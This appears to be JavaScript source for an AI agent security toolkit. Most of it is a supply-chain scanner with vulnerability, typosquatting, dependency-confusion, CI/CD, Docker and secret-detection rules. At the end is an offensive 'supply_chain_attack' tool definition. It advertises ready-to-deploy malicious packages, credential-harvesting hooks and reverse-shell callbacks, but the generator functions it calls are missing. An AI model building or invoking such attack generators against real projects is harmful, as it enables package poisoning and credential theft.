// Jarvis Cyber — Supply Chain Attack Scanner Tool
// Master-level supply chain security analysis: dependency audit, typosquatting,
// dependency confusion, CI/CD pipeline attacks, container analysis, SBOM generation
import { execSync } from 'child_process';
import { existsSync, readFileSync, readdirSync, statSync, writeFileSync, mkdirSync } from 'fs';
import { join, basename } from 'path';

// ═══════════════════════════════════════════════════════════
// TOOL 1: supply_chain_scan
// ═══════════════════════════════════════════════════════════

export const definition = {
  type: 'function',
  function: {
    name: 'supply_chain_scan',
    description: 'Comprehensive supply chain attack scanner. Analyzes project dependencies for vulnerabilities, typosquatting, dependency confusion, CI/CD pipeline risks, Docker supply chain issues, and generates SBOM. This is the primary supply chain attack tool.',
    parameters: {
      type: 'object',
      properties: {
        target: {
          type: 'string',
          description: 'Path to the project directory to scan, or a Git repository URL to clone and scan',
        },
        scan_type: {
          type: 'string',
          enum: ['full', 'dependencies', 'typosquatting', 'dependency_confusion', 'cicd', 'docker', 'sbom', 'secrets'],
          description: 'Type of supply chain scan to perform. "full" runs all scans.',
        },
        ecosystem: {
          type: 'string',
          enum: ['auto', 'npm', 'pip', 'maven', 'go', 'cargo', 'composer', 'ruby', 'nuget'],
          description: 'Package ecosystem to scan. "auto" detects from lockfiles.',
        },
      },
      required: ['target', 'scan_type'],
    },
  },
};

export async function execute(args) {
  const { target, scan_type = 'full', ecosystem = 'auto' } = args;
  const startTime = Date.now();

  try {
    let projectDir = target;

    // If target is a git URL, clone it
    if (target.startsWith('http') || target.startsWith('git@')) {
      const tmpDir = `/tmp/jarvis-sca-${Date.now()}`;
      try {
        execSync(`git clone --depth 1 "${target}" "${tmpDir}"`, { timeout: 60000, encoding: 'utf-8' });
        projectDir = tmpDir;
      } catch (e) {
        return { success: false, error: `Failed to clone repository: ${e.message}` };
      }
    }

    if (!existsSync(projectDir)) {
      return { success: false, error: `Directory not found: ${projectDir}` };
    }

    const results = {
      success: true,
      target: projectDir,
      scan_type,
      timestamp: new Date().toISOString(),
      duration_ms: 0,
      ecosystems_detected: [],
      findings: [],
      summary: { critical: 0, high: 0, medium: 0, low: 0, info: 0, total: 0 },
      sbom: null,
    };

    // Detect ecosystems
    const detected = detectEcosystems(projectDir);
    results.ecosystems_detected = detected.map(d => d.ecosystem);

    // Run scans
    if (scan_type === 'full' || scan_type === 'dependencies') {
      const depFindings = await scanDependencies(projectDir, detected, ecosystem);
      results.findings.push(...depFindings);
    }
    if (scan_type === 'full' || scan_type === 'typosquatting') {
      results.findings.push(...await scanTyposquatting(projectDir, detected, ecosystem));
    }
    if (scan_type === 'full' || scan_type === 'dependency_confusion') {
      results.findings.push(...await scanDependencyConfusion(projectDir, detected, ecosystem));
    }
    if (scan_type === 'full' || scan_type === 'cicd') {
      results.findings.push(...scanCICD(projectDir));
    }
    if (scan_type === 'full' || scan_type === 'docker') {
      results.findings.push(...scanDocker(projectDir));
    }
    if (scan_type === 'full' || scan_type === 'secrets') {
      results.findings.push(...scanSecrets(projectDir));
    }
    if (scan_type === 'full' || scan_type === 'sbom') {
      results.sbom = generateSBOM(projectDir, detected);
    }

    // Tally summary
    for (const f of results.findings) {
      const sev = (f.severity || 'info').toLowerCase();
      if (results.summary[sev] !== undefined) results.summary[sev]++;
      results.summary.total++;
    }

    results.duration_ms = Date.now() - startTime;
    return results;
  } catch (err) {
    return { success: false, error: err.message, duration_ms: Date.now() - startTime };
  }
}

// ═══════════════════════════════════════════════════════════
// TOOL 2: supply_chain_lookup
// ═══════════════════════════════════════════════════════════

export const lookupDefinition = {
  type: 'function',
  function: {
    name: 'supply_chain_lookup',
    description: 'Look up a specific package for known supply chain threats, vulnerabilities, and risk indicators using OSV.dev API and local threat intelligence.',
    parameters: {
      type: 'object',
      properties: {
        package_name: { type: 'string', description: 'Package name to look up (e.g., "lodash", "requests", "log4j")' },
        ecosystem: { type: 'string', enum: ['npm', 'PyPI', 'Maven', 'Go', 'crates.io', 'Packagist', 'RubyGems', 'NuGet'], description: 'Package ecosystem' },
      },
      required: ['package_name', 'ecosystem'],
    },
  },
};

export async function executeLookup(args) {
  const { package_name, ecosystem } = args;
  try {
    // Query OSV.dev for vulnerabilities
    const osvResult = await queryOSV(package_name, ecosystem);
    
    // Dynamic typosquatting check
    const typoRisk = await checkTyposquatRisk(package_name, ecosystem);
    
    // Check if package actually exists on public registry
    const ecoKey = ecosystem === 'PyPI' ? 'pip' : ecosystem.toLowerCase();
    const existsOnRegistry = await checkPackageExistsOnPublicRegistry(package_name, ecoKey);
    
    return {
      success: true,
      package: package_name,
      ecosystem,
      exists_on_registry: existsOnRegistry,
      vulnerabilities: osvResult.vulns || [],
      total_vulns: osvResult.total || 0,
      risk_level: osvResult.total > 5 ? 'HIGH' : osvResult.total > 0 ? 'MEDIUM' : 'LOW',
      typosquatting_risk: typoRisk,
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════════════════
// ECOSYSTEM DETECTION
// ═══════════════════════════════════════════════════════════

function detectEcosystems(dir) {
  const ecosystems = [];
  const checks = [
    { file: 'package.json', lock: 'package-lock.json', alt: 'yarn.lock', ecosystem: 'npm' },
    { file: 'requirements.txt', lock: 'Pipfile.lock', alt: 'poetry.lock', ecosystem: 'pip' },
    { file: 'setup.py', ecosystem: 'pip' },
    { file: 'pyproject.toml', ecosystem: 'pip' },
    { file: 'pom.xml', ecosystem: 'maven' },
    { file: 'build.gradle', ecosystem: 'maven' },
    { file: 'go.mod', lock: 'go.sum', ecosystem: 'go' },
    { file: 'Cargo.toml', lock: 'Cargo.lock', ecosystem: 'cargo' },
    { file: 'composer.json', lock: 'composer.lock', ecosystem: 'composer' },
    { file: 'Gemfile', lock: 'Gemfile.lock', ecosystem: 'ruby' },
  ];

  for (const check of checks) {
    if (existsSync(join(dir, check.file)) ||
        (check.lock && existsSync(join(dir, check.lock))) ||
        (check.alt && existsSync(join(dir, check.alt)))) {
      if (!ecosystems.find(e => e.ecosystem === check.ecosystem)) {
        ecosystems.push({ ecosystem: check.ecosystem, manifest: check.file, lockfile: check.lock || check.alt || null });
      }
    }
  }
  return ecosystems;
}

// ═══════════════════════════════════════════════════════════
// DEPENDENCY VULNERABILITY SCANNING
// ═══════════════════════════════════════════════════════════

async function scanDependencies(dir, ecosystems, filterEco) {
  const findings = [];
  for (const eco of ecosystems) {
    if (filterEco !== 'auto' && eco.ecosystem !== filterEco) continue;
    const deps = parseDependencies(dir, eco);

    for (const dep of deps.slice(0, 200)) {
      try {
        const result = await queryOSV(dep.name, ecoToOSVEcosystem(eco.ecosystem), dep.version);
        if (result.vulns && result.vulns.length > 0) {
          for (const vuln of result.vulns.slice(0, 5)) {
            findings.push({
              type: 'vulnerable_dependency',
              severity: vuln.severity || 'medium',
              package: dep.name,
              version: dep.version,
              ecosystem: eco.ecosystem,
              vuln_id: vuln.id,
              summary: vuln.summary || '',
              fixed_version: vuln.fixed || null,
              location: eco.manifest || eco.lockfile,
              remediation: vuln.fixed ? `Upgrade ${dep.name} to ${vuln.fixed}` : `Review and mitigate ${vuln.id}`,
            });
          }
        }
      } catch { /* skip */ }
    }

    findings.push(...runNativeAudit(dir, eco.ecosystem));
  }
  return findings;
}

function parseDependencies(dir, eco) {
  const deps = [];
  try {
    switch (eco.ecosystem) {
      case 'npm': {
        const pkgPath = join(dir, 'package.json');
        if (existsSync(pkgPath)) {
          const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
          for (const [name, ver] of Object.entries({ ...pkg.dependencies, ...pkg.devDependencies })) {
            deps.push({ name, version: ver.replace(/[\^~>=<]/g, '') });
          }
        }
        break;
      }
      case 'pip': {
        const reqPath = join(dir, 'requirements.txt');
        if (existsSync(reqPath)) {
          for (const line of readFileSync(reqPath, 'utf-8').split('\n')) {
            const match = line.trim().match(/^([a-zA-Z0-9_.-]+)\s*(?:[=<>!~]+\s*(.+))?/);
            if (match && !match[1].startsWith('#')) deps.push({ name: match[1], version: match[2] || '*' });
          }
        }
        break;
      }
      case 'go': {
        const goModPath = join(dir, 'go.mod');
        if (existsSync(goModPath)) {
          for (const m of readFileSync(goModPath, 'utf-8').matchAll(/^\s*([^\s]+)\s+(v[^\s]+)/gm)) {
            deps.push({ name: m[1], version: m[2] });
          }
        }
        break;
      }
      case 'cargo': {
        const cargoPath = join(dir, 'Cargo.toml');
        if (existsSync(cargoPath)) {
          for (const m of readFileSync(cargoPath, 'utf-8').matchAll(/^([a-zA-Z0-9_-]+)\s*=\s*"([^"]+)"/gm)) {
            deps.push({ name: m[1], version: m[2] });
          }
        }
        break;
      }
      case 'composer': {
        const composerPath = join(dir, 'composer.json');
        if (existsSync(composerPath)) {
          const pkg = JSON.parse(readFileSync(composerPath, 'utf-8'));
          for (const [name, ver] of Object.entries({ ...pkg.require, ...pkg['require-dev'] })) {
            if (name !== 'php') deps.push({ name, version: ver.replace(/[\^~]/g, '') });
          }
        }
        break;
      }
      case 'ruby': {
        const gemfilePath = join(dir, 'Gemfile');
        if (existsSync(gemfilePath)) {
          for (const line of readFileSync(gemfilePath, 'utf-8').split('\n')) {
            const match = line.match(/gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?/);
            if (match) deps.push({ name: match[1], version: match[2] || '*' });
          }
        }
        break;
      }
      case 'maven': {
        const pomPath = join(dir, 'pom.xml');
        if (existsSync(pomPath)) {
          for (const m of readFileSync(pomPath, 'utf-8').matchAll(/<artifactId>([^<]+)<\/artifactId>\s*<version>([^<]+)<\/version>/g)) {
            deps.push({ name: m[1], version: m[2] });
          }
        }
        break;
      }
    }
  } catch { /* ignore */ }
  return deps;
}

function ecoToOSVEcosystem(eco) {
  return { npm: 'npm', pip: 'PyPI', maven: 'Maven', go: 'Go', cargo: 'crates.io', composer: 'Packagist', ruby: 'RubyGems', nuget: 'NuGet' }[eco] || eco;
}

function runNativeAudit(dir, eco) {
  const findings = [];
  try {
    if (eco === 'npm' && existsSync(join(dir, 'package-lock.json'))) {
      const out = execSync('npm audit --json 2>/dev/null', { cwd: dir, timeout: 30000, encoding: 'utf-8' });
      const audit = JSON.parse(out);
      if (audit.vulnerabilities) {
        for (const [name, info] of Object.entries(audit.vulnerabilities)) {
          findings.push({ type: 'native_audit', severity: info.severity || 'medium', package: name, ecosystem: 'npm', summary: `npm audit: ${info.title || name}`, remediation: info.fixAvailable ? 'Run: npm audit fix' : 'Manual review required', location: 'package-lock.json' });
        }
      }
    }
  } catch { /* tool not available */ }
  return findings;
}

// ═══════════════════════════════════════════════════════════
// TYPOSQUATTING DETECTION — DYNAMIC
// Fetches popular packages from registries dynamically
// with in-memory cache + static fallback
// ═══════════════════════════════════════════════════════════

// Static fallback — only used if live API calls fail
const FALLBACK_NPM = ['react','lodash','express','axios','moment','chalk','commander','debug','uuid','dotenv','typescript','webpack','babel','jest','mocha','eslint','prettier','underscore','async','bluebird','request','inquirer','minimist','yargs','glob','mkdirp','rimraf','semver','fs-extra','cross-env','classnames','prop-types','body-parser','cors','jsonwebtoken','bcrypt','mongoose','sequelize','socket.io','redis','pg','mysql2','nodemon','concurrently','tslib','rxjs','core-js','next','vite','esbuild','turbo','zod','prisma','drizzle-orm','trpc','svelte','vue','angular','nuxt','remix','astro','tailwindcss','postcss','autoprefixer','sass','less','styled-components','emotion'];
const FALLBACK_PYPI = ['requests','numpy','pandas','flask','django','boto3','setuptools','pip','wheel','urllib3','certifi','six','pyyaml','cryptography','jinja2','click','pillow','scipy','matplotlib','sqlalchemy','pytest','tqdm','beautifulsoup4','lxml','scrapy','celery','redis','gunicorn','uvicorn','fastapi','pydantic','httpx','aiohttp','transformers','torch','tensorflow','keras','scikit-learn','opencv-python','black','ruff','mypy','poetry','pipenv','rich','typer'];

// Dynamic cache — populated on first use per session
const _dynamicPopularCache = { npm: null, pip: null, npmFetchedAt: 0, pipFetchedAt: 0 };
const CACHE_TTL = 3600000; // 1 hour

async function getPopularPackages(ecosystem) {
  const now = Date.now();
  
  if (ecosystem === 'npm') {
    if (_dynamicPopularCache.npm && (now - _dynamicPopularCache.npmFetchedAt) < CACHE_TTL) {
      return _dynamicPopularCache.npm;
    }
    // Start with fallback, merge dynamic results on top
    const combined = new Set(FALLBACK_NPM);
    try {
      const res = await fetch('https://registry.npmjs.org/-/v1/search?text=boost-exact:true&popularity=1.0&size=250', {
        signal: AbortSignal.timeout(8000),
      });
      if (res.ok) {
        const data = await res.json();
        for (const o of data.objects || []) {
          if (o.package?.name) combined.add(o.package.name);
        }
      }
    } catch { /* use fallback only */ }
    const result = [...combined];
    _dynamicPopularCache.npm = result;
    _dynamicPopularCache.npmFetchedAt = now;
    return result;
  }
  
  if (ecosystem === 'pip') {
    if (_dynamicPopularCache.pip && (now - _dynamicPopularCache.pipFetchedAt) < CACHE_TTL) {
      return _dynamicPopularCache.pip;
    }
    const combined = new Set(FALLBACK_PYPI);
    try {
      const res = await fetch('https://hugovk.github.io/top-pypi-packages/top-pypi-packages-30-days.min.json', {
        signal: AbortSignal.timeout(8000),
      });
      if (res.ok) {
        const data = await res.json();
        for (const r of (data.rows || []).slice(0, 250)) {
          if (r.project) combined.add(r.project);
        }
      }
    } catch { /* use fallback only */ }
    const result = [...combined];
    _dynamicPopularCache.pip = result;
    _dynamicPopularCache.pipFetchedAt = now;
    return result;
  }

  return [];
}

async function scanTyposquatting(dir, ecosystems, filterEco) {
  const findings = [];
  for (const eco of ecosystems) {
    if (filterEco !== 'auto' && eco.ecosystem !== filterEco) continue;
    const deps = parseDependencies(dir, eco);
    const popular = await getPopularPackages(eco.ecosystem);

    for (const dep of deps) {
      const name = dep.name.toLowerCase().replace(/^@[^/]+\//, '');
      for (const pop of popular) {
        if (name === pop) continue;
        const dist = levenshtein(name, pop);
        if (dist > 0 && dist <= 2 && name.length > 3) {
          findings.push({
            type: 'typosquatting_risk', severity: dist === 1 ? 'high' : 'medium',
            package: dep.name, version: dep.version, ecosystem: eco.ecosystem,
            similar_to: pop, edit_distance: dist,
            summary: `"${dep.name}" is ${dist} char(s) away from popular package "${pop}" — possible typosquatting`,
            remediation: `Verify this is the correct package. Compare with official "${pop}".`,
            location: eco.manifest || '',
          });
        }
      }
    }
  }
  return findings;
}

function levenshtein(a, b) {
  const m = a.length, n = b.length;
  const dp = Array.from({ length: m + 1 }, () => Array(n + 1).fill(0));
  for (let i = 0; i <= m; i++) dp[i][0] = i;
  for (let j = 0; j <= n; j++) dp[0][j] = j;
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      dp[i][j] = a[i - 1] === b[j - 1] ? dp[i - 1][j - 1] : 1 + Math.min(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1]);
    }
  }
  return dp[m][n];
}

async function checkTyposquatRisk(name, ecosystem) {
  const ecoKey = ecosystem === 'PyPI' ? 'pip' : ecosystem === 'npm' ? 'npm' : ecosystem;
  const popular = await getPopularPackages(ecoKey);
  const lower = name.toLowerCase();
  for (const pop of popular) {
    const dist = levenshtein(lower, pop);
    if (dist > 0 && dist <= 2) return { is_risky: true, similar_to: pop, edit_distance: dist };
  }
  return { is_risky: false };
}

// ═══════════════════════════════════════════════════════════
// DEPENDENCY CONFUSION DETECTION — DYNAMIC
// Actually checks if packages exist on public registries
// ═══════════════════════════════════════════════════════════

async function checkPackageExistsOnPublicRegistry(name, ecosystem) {
  try {
    if (ecosystem === 'npm') {
      const res = await fetch(`https://registry.npmjs.org/${encodeURIComponent(name)}`, {
        method: 'HEAD',
        signal: AbortSignal.timeout(5000),
      });
      return res.status === 200;
    }
    if (ecosystem === 'pip') {
      const res = await fetch(`https://pypi.org/pypi/${encodeURIComponent(name)}/json`, {
        method: 'HEAD',
        signal: AbortSignal.timeout(5000),
      });
      return res.status === 200;
    }
  } catch { /* network error — assume it doesn't exist */ }
  return false;
}

async function scanDependencyConfusion(dir, ecosystems, filterEco) {
  const findings = [];
  for (const eco of ecosystems) {
    if (filterEco !== 'auto' && eco.ecosystem !== filterEco) continue;
    const deps = parseDependencies(dir, eco);
    for (const dep of deps) {
      if (eco.ecosystem === 'npm') {
        // Check scoped packages with internal-looking scope names
        if (dep.name.startsWith('@')) {
          const scope = dep.name.split('/')[0];
          if (/^@(internal|private|company|corp|org|team|dev|staging|prod)/i.test(scope)) {
            // Actually check if this scope/package exists on npm
            const existsPublic = await checkPackageExistsOnPublicRegistry(dep.name, 'npm');
            findings.push({
              type: 'dependency_confusion', severity: existsPublic ? 'medium' : 'critical',
              package: dep.name, ecosystem: 'npm',
              summary: existsPublic
                ? `Scoped package "${dep.name}" exists on public npm — verify it's your org's legitimate package`
                : `Scoped package "${dep.name}" NOT found on public npm — high dependency confusion risk. Attacker can register it!`,
              remediation: 'Verify scope ownership on npmjs.com. Use .npmrc to enforce private registry.',
              location: 'package.json',
            });
          }
        }

        // Check unscoped packages with internal naming
        if (/^(internal-|private-|company-|corp-|myorg-)/.test(dep.name)) {
          const existsPublic = await checkPackageExistsOnPublicRegistry(dep.name, 'npm');
          findings.push({
            type: 'dependency_confusion', severity: existsPublic ? 'low' : 'high',
            package: dep.name, ecosystem: 'npm',
            summary: existsPublic
              ? `Package "${dep.name}" has internal naming but exists on npm — verify it's legitimate`
              : `Package "${dep.name}" has internal naming and does NOT exist on npm — attackers can claim this name!`,
            remediation: 'Use scoped name (@org/pkg) and configure .npmrc for private registry.',
            location: 'package.json',
          });
        }
      }
      if (eco.ecosystem === 'pip' && /^(internal[-_]|private[-_]|company[-_])/.test(dep.name)) {
        const existsPublic = await checkPackageExistsOnPublicRegistry(dep.name, 'pip');
        findings.push({
          type: 'dependency_confusion', severity: existsPublic ? 'low' : 'high',
          package: dep.name, ecosystem: 'pip',
          summary: existsPublic
            ? `Package "${dep.name}" has internal naming but exists on PyPI — verify it's legitimate`
            : `Package "${dep.name}" has internal naming and does NOT exist on PyPI — dependency confusion target!`,
          remediation: 'Use --index-url to point to private PyPI.',
          location: 'requirements.txt',
        });
      }
    }
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════
// CI/CD PIPELINE SCANNING
// ═══════════════════════════════════════════════════════════

function scanCICD(dir) {
  const findings = [];

  // GitHub Actions
  const ghDir = join(dir, '.github', 'workflows');
  if (existsSync(ghDir)) {
    try {
      for (const file of readdirSync(ghDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'))) {
        const content = readFileSync(join(ghDir, file), 'utf-8');
        const loc = `.github/workflows/${file}`;

        for (const m of content.matchAll(/uses:\s+([^\s@]+)@(main|master|latest|dev)/gi)) {
          findings.push({ type: 'cicd_unpinned_action', severity: 'high', summary: `Unpinned action "${m[1]}@${m[2]}" — supply chain injection risk`, remediation: `Pin to commit SHA: uses: ${m[1]}@<sha>`, location: loc });
        }
        if (/pull_request_target/i.test(content)) {
          findings.push({ type: 'cicd_dangerous_trigger', severity: 'critical', summary: '"pull_request_target" gives WRITE access + secrets to forked PRs', remediation: 'Use "pull_request" instead.', location: loc });
        }
        if (/\$\{\{\s*github\.event\.(issue|pull_request|comment)\.(title|body|head\.ref)/i.test(content)) {
          findings.push({ type: 'cicd_script_injection', severity: 'critical', summary: 'User-controlled input used in run: block — script injection', remediation: 'Store in env var first, never use ${{ }} directly in run:.', location: loc });
        }
        if (/pull_request_target/.test(content) && /actions\/checkout.*ref.*\$\{\{.*github\.event\.pull_request/i.test(content)) {
          findings.push({ type: 'cicd_checkout_exploit', severity: 'critical', summary: 'PR code checkout in pull_request_target — arbitrary code execution with secrets', remediation: 'NEVER checkout PR code in pull_request_target context.', location: loc });
        }
        if (/permissions:\s*write-all/i.test(content)) {
          findings.push({ type: 'cicd_excessive_permissions', severity: 'medium', summary: 'Overly permissive workflow permissions (write-all)', remediation: 'Use minimal permissions. Grant write only where needed.', location: loc });
        }
        for (const pattern of [/password\s*[:=]\s*["'][^$\s]{4,}["']/gi, /api[_-]?key\s*[:=]\s*["'][^$\s]{8,}["']/gi, /token\s*[:=]\s*["'][^$\s]{8,}["']/gi]) {
          if (pattern.test(content)) { findings.push({ type: 'cicd_hardcoded_secret', severity: 'critical', summary: 'Hardcoded secret in CI/CD workflow', remediation: 'Use GitHub Secrets: ${{ secrets.SECRET_NAME }}', location: loc }); break; }
        }
      }
    } catch { /* ignore */ }
  }

  // GitLab CI
  const gitlabCI = join(dir, '.gitlab-ci.yml');
  if (existsSync(gitlabCI)) {
    try {
      const content = readFileSync(gitlabCI, 'utf-8');
      if (/curl.*\|.*sh/i.test(content)) findings.push({ type: 'cicd_curl_pipe_sh', severity: 'critical', summary: 'curl piped to shell in GitLab CI', remediation: 'Download, verify checksum, then execute.', location: '.gitlab-ci.yml' });
      if (/include:\s*\n?\s*-?\s*remote:/i.test(content)) findings.push({ type: 'cicd_remote_include', severity: 'high', summary: 'Remote template include — external config could be compromised', remediation: 'Pin to commit SHA.', location: '.gitlab-ci.yml' });
    } catch { /* ignore */ }
  }

  // Jenkinsfile
  if (existsSync(join(dir, 'Jenkinsfile'))) {
    try {
      const content = readFileSync(join(dir, 'Jenkinsfile'), 'utf-8');
      if (/script\s*\{[\s\S]*?sh\s+['"].*\$\{/.test(content)) findings.push({ type: 'cicd_jenkins_injection', severity: 'high', summary: 'Command injection in Jenkinsfile — variable interpolation', remediation: 'Use single quotes for shell commands.', location: 'Jenkinsfile' });
    } catch { /* ignore */ }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════
// DOCKER SUPPLY CHAIN SCANNING
// ═══════════════════════════════════════════════════════════

function scanDocker(dir) {
  const findings = [];
  const dockerfiles = [];
  try {
    for (const e of readdirSync(dir)) {
      if (e === 'Dockerfile' || e.startsWith('Dockerfile.') || e.endsWith('.Dockerfile')) dockerfiles.push(e);
    }
  } catch { return findings; }

  for (const df of dockerfiles) {
    try {
      const content = readFileSync(join(dir, df), 'utf-8');
      for (const m of content.matchAll(/^FROM\s+([^\s]+)/gim)) {
        if (!m[1].includes(':') || m[1].endsWith(':latest')) findings.push({ type: 'docker_unpinned_base', severity: 'high', package: m[1], summary: `Unpinned base image "${m[1]}" — image poisoning risk`, remediation: `Pin to digest: FROM ${m[1].split(':')[0]}@sha256:<digest>`, location: df });
      }
      if (/^ADD\s+https?:\/\//im.test(content)) findings.push({ type: 'docker_add_url', severity: 'high', summary: 'ADD from URL without integrity check', remediation: 'Use COPY. Download with curl and verify checksum.', location: df });
      if (/curl.*\|\s*(ba)?sh/i.test(content)) findings.push({ type: 'docker_curl_pipe_sh', severity: 'critical', summary: 'curl piped to shell in Dockerfile — remote code execution at build time', remediation: 'Download, verify checksum, then execute.', location: df });
      if (!/^USER\s+(?!root)/im.test(content)) findings.push({ type: 'docker_root_user', severity: 'medium', summary: 'Container runs as root — container escape = full host access', remediation: 'Add: USER 1001:1001', location: df });
      if (/--no-check-certificate/i.test(content)) findings.push({ type: 'docker_no_tls_verify', severity: 'high', summary: 'TLS verification disabled — MITM injection risk', remediation: 'Remove --no-check-certificate. Fix certs instead.', location: df });
      if (/^ENV\s+.*(?:PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)\s*=\s*\S+/im.test(content)) findings.push({ type: 'docker_secret_in_env', severity: 'critical', summary: 'Secret hardcoded in Dockerfile ENV — visible in image layers', remediation: 'Use BuildKit secrets: RUN --mount=type=secret', location: df });
    } catch { /* ignore */ }
  }

  // docker-compose
  for (const cf of ['docker-compose.yml', 'docker-compose.yaml']) {
    if (existsSync(join(dir, cf))) {
      try {
        const content = readFileSync(join(dir, cf), 'utf-8');
        if (/privileged:\s*true/i.test(content)) findings.push({ type: 'docker_privileged', severity: 'critical', summary: 'Privileged container — trivial escape', remediation: 'Remove privileged: true. Use cap_add.', location: cf });
        if (/network_mode:\s*["']?host/i.test(content)) findings.push({ type: 'docker_host_network', severity: 'medium', summary: 'Host network mode — no network isolation', remediation: 'Use bridge networking.', location: cf });
      } catch { /* ignore */ }
    }
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════
// SECRET SCANNING
// ═══════════════════════════════════════════════════════════

function scanSecrets(dir) {
  const findings = [];
  const patterns = [
    { regex: /AKIA[0-9A-Z]{16}/g, name: 'AWS Access Key ID', severity: 'critical' },
    { regex: /ghp_[a-zA-Z0-9]{36}/g, name: 'GitHub Personal Access Token', severity: 'critical' },
    { regex: /sk-[a-zA-Z0-9]{48}/g, name: 'OpenAI API Key', severity: 'critical' },
    { regex: /xox[bpoas]-[a-zA-Z0-9-]+/g, name: 'Slack Token', severity: 'high' },
    { regex: /-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----/g, name: 'Private Key', severity: 'critical' },
    { regex: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g, name: 'SendGrid API Key', severity: 'high' },
  ];

  const scanExts = new Set(['.js', '.ts', '.py', '.rb', '.go', '.java', '.yml', '.yaml', '.json', '.env', '.cfg', '.conf', '.toml', '.sh', '.xml']);
  const skipDirs = new Set(['node_modules', '.git', 'vendor', '__pycache__', 'dist', 'build', '.venv', 'venv']);

  function walk(d, depth = 0) {
    if (depth > 5) return;
    try {
      for (const entry of readdirSync(d)) {
        if (skipDirs.has(entry)) continue;
        const full = join(d, entry);
        try {
          const stat = statSync(full);
          if (stat.isDirectory()) { walk(full, depth + 1); }
          else if (stat.isFile() && stat.size < 500000) {
            const ext = entry.includes('.') ? '.' + entry.split('.').pop() : '';
            if (scanExts.has(ext) || entry === '.env' || entry === '.env.local') {
              const content = readFileSync(full, 'utf-8');
              for (const p of patterns) {
                if (p.regex.test(content)) {
                  p.regex.lastIndex = 0;
                  findings.push({ type: 'hardcoded_secret', severity: p.severity, summary: `${p.name} found in source code`, package: full.replace(dir + '/', ''), remediation: 'Remove from source. Rotate credential immediately.', location: full.replace(dir + '/', '') });
                  break;
                }
              }
            }
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  }

  walk(dir);
  return findings;
}

// ═══════════════════════════════════════════════════════════
// SBOM GENERATION
// ═══════════════════════════════════════════════════════════

function generateSBOM(dir, ecosystems) {
  const sbom = {
    bomFormat: 'CycloneDX', specVersion: '1.4', version: 1,
    metadata: { timestamp: new Date().toISOString(), tools: [{ vendor: 'Jarvis Cyber', name: 'supply_chain_scanner', version: '1.0.0' }], component: { type: 'application', name: basename(dir), version: '0.0.0' } },
    components: [],
  };
  for (const eco of ecosystems) {
    for (const dep of parseDependencies(dir, eco)) {
      sbom.components.push({ type: 'library', name: dep.name, version: dep.version, purl: `pkg:${eco.ecosystem}/${dep.name}@${dep.version}` });
    }
  }
  return sbom;
}

// ═══════════════════════════════════════════════════════════
// OSV.dev API
// ═══════════════════════════════════════════════════════════

async function queryOSV(packageName, ecosystem, version) {
  try {
    const body = { package: { name: packageName, ecosystem } };
    if (version && version !== '*') body.version = version;
    const res = await fetch('https://api.osv.dev/v1/query', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body), signal: AbortSignal.timeout(10000) });
    if (!res.ok) return { vulns: [], total: 0 };
    const data = await res.json();
    const vulns = (data.vulns || []).map(v => {
      let severity = 'medium';
      if (v.database_specific?.severity) severity = v.database_specific.severity.toLowerCase();
      else if (v.severity?.[0]?.score >= 9) severity = 'critical';
      else if (v.severity?.[0]?.score >= 7) severity = 'high';
      let fixed = null;
      for (const a of v.affected || []) { for (const r of a.ranges || []) { for (const ev of r.events || []) { if (ev.fixed) { fixed = ev.fixed; break; } } if (fixed) break; } if (fixed) break; }
      return { id: v.id, summary: v.summary || v.details?.slice(0, 200) || '', severity, fixed, published: v.published, aliases: v.aliases || [] };
    });
    return { vulns, total: vulns.length };
  } catch { return { vulns: [], total: 0 }; }
}

// ═══════════════════════════════════════════════════════════
// TOOL 3: supply_chain_attack — OFFENSIVE RED TEAM
// Generates attack payloads for supply chain compromise
// ═══════════════════════════════════════════════════════════


export const attackDefinition = {
  type: 'function',
  function: {
    name: 'supply_chain_attack',
    description: 'RED TEAM: Generate supply chain attack payloads. Creates dependency confusion packages, typosquatting skeletons, CI/CD exploit scripts, container poison Dockerfiles, and credential harvesting hooks. Outputs ready-to-deploy attack artifacts.',
    parameters: {
      type: 'object',
      properties: {
        attack_type: {
          type: 'string',
          enum: ['dependency_confusion', 'typosquatting', 'cicd_exploit', 'container_poison', 'credential_harvest', 'malicious_update', 'build_cache_poison'],
          description: 'Type of supply chain attack to generate',
        },
        target_package: {
          type: 'string',
          description: 'Target package name to impersonate/attack (e.g., internal-auth-lib, lodash)',
        },
        ecosystem: {
          type: 'string',
          enum: ['npm', 'pip', 'maven', 'go', 'cargo', 'ruby'],
          description: 'Target package ecosystem',
        },
        callback_host: {
          type: 'string',
          description: 'Attacker callback host for reverse shell / data exfiltration (IP:PORT)',
        },
        output_dir: {
          type: 'string',
          description: 'Directory to write the attack payload files to',
        },
      },
      required: ['attack_type', 'target_package', 'ecosystem'],
    },
  },
};

export async function executeAttack(args) {
  const { attack_type, target_package, ecosystem, callback_host = '0.0.0.0:4444', output_dir = '/tmp/sc-payload' } = args;

  try {
    mkdirSync(output_dir, { recursive: true });

    switch (attack_type) {
      case 'dependency_confusion':
        return generateDepConfusionPayload(target_package, ecosystem, callback_host, output_dir);
      case 'typosquatting':
        return generateTyposquatPayload(target_package, ecosystem, callback_host, output_dir);
      case 'cicd_exploit':
        return generateCICDExploit(target_package, callback_host, output_dir);
      case 'container_poison':
        return generateContainerPoison(target_package, callback_host, output_dir);
      case 'credential_harvest':
        return generateCredHarvester(target_package, ecosystem, callback_host, output_dir);
      case 'malicious_update':
        return generateMaliciousUpdate(target_package, ecosystem, callback_host, output_dir);
      case 'build_cache_poison':
        return generateBuildCachePoison(target_package, ecosystem, callback_host, output_dir);
      default:
        return { success: false, error: `Unknown attack type: ${attack_type}` };
    }
  } catch (err) {
    return { success: false, error: err.message };
  }
}

